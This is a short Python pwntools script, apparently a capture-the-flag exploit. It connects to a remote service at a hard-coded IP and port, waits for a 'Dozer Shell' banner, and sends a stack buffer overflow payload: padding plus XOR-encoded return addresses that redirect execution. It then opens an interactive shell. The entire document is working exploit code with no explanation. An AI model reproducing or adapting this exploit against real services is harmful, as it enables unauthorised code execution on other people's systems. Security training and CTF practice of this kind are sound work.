from pwn import*
context.log_level ='DEBUG'

def m(payload):
	retval = ""
	for i in payload:
		if i == '\x06':
			retval += chr((ord(i) + 1)^6)
		elif i == '\x00':
			retval += i
		else:
			retval += chr(ord(i)^6)
	return retval
	
p =remote('118.31.11.216',30009)
p.recvuntil('[*] ---------------- Dozer Shell ----------------\n')
p.sendline( 'FMYY' + 'U'*0x54+ m(p64(0x4007DB)) +m(p64(0x400796))*10)


p.interactive()
